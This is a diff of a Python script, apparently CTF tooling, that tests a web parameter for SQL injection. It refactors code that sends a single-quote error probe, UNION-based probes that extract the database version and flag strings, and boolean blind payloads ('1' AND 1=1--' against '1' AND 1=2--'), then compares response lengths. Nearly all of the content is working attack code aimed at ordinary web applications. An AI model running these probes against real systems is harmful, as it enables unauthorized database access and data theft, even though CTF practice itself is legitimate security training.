@@ -9,8 +9,9 @@
 """
 import argparse
 import re
-import requests
 import sys
+
+import requests
 
 
 def _probe(url, method, headers, data, param, payload, timeout=15):
@@ -48,11 +49,11 @@ def main():
     data = {k: v for k, v in (p.split("=", 1) for p in args.data.split("&") if p)} if args.data else {}
 
     # 1) 基线
-    base_status, base_len, base_text = _probe(args.url, args.method, headers, data, args.param, "1", args.timeout)
+    base_status, base_len, _ = _probe(args.url, args.method, headers, data, args.param, "1", args.timeout)
     print(f"[base] status={base_status} len={base_len}")
 
     # 2) 单引号报错基线
-    err_status, err_len, err_text = _probe(args.url, args.method, headers, data, args.param, "1'", args.timeout)
+    err_status, err_len, _ = _probe(args.url, args.method, headers, data, args.param, "1'", args.timeout)
     print(f"[error] status={err_status} len={err_len}")
 
     # 3) UNION 探测（先猜 1 列）
@@ -77,12 +78,14 @@ def main():
         m = re.search(re.escape(args.marker) + r"(.+?)" + re.escape(args.marker), ext_text)
         if m:
             print(f"[extract] version={m.group(1)}")
-        print(f"[flag_candidates] {re.findall(r'flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}', ext_text, re.I)}")
+        # 正则预编译：f-string 表达式内反斜杠在 Python 3.11 是语法错误（PEP 701 3.12+ 才放开）
+        flag_pattern = re.compile(r"flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}", re.IGNORECASE)
+        print(f"[flag_candidates] {flag_pattern.findall(ext_text)}")
         return 0
 
     # 4) 布尔盲注：and 1=1 vs and 1=2 长度差异
-    t1_status, t1_len, _ = _probe(args.url, args.method, headers, data, args.param, "1' AND 1=1--", args.timeout)
-    t2_status, t2_len, _ = _probe(args.url, args.method, headers, data, args.param, "1' AND 1=2--", args.timeout)
+    _, t1_len, _ = _probe(args.url, args.method, headers, data, args.param, "1' AND 1=1--", args.timeout)
+    _, t2_len, _ = _probe(args.url, args.method, headers, data, args.param, "1' AND 1=2--", args.timeout)
     print(f"[bool] true={t1_len} false={t2_len} diff={abs(t1_len-t2_len)}")
     if abs(t1_len - t2_len) > 5:
         print("[verdict] 存在布尔盲注差异")
